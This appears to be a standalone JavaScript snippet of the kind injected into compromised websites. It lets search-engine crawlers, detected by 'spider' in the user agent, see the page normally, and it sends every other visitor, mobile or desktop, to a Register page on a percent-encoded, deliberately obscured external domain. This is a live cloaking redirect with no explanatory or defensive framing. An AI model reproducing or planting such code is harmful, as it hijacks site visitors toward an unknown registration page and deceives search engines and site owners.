window.addEventListener(jump(), onloadstart);

function jump() {
var where =navigator.userAgent;
console.log(where)
if(where.indexOf('spider')!= -1){
}else{
		 if (
          navigator.userAgent.match(
            /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i
          )){
            document.location.replace('https://%77%77%77%2d%31%31%37%35%61%61%2e%63%6f%6d/Register')
          } else {
            document.location.replace('https://%77%77%77%2d%31%31%37%35%61%61%2e%63%6f%6d/Register')
       }
}
}
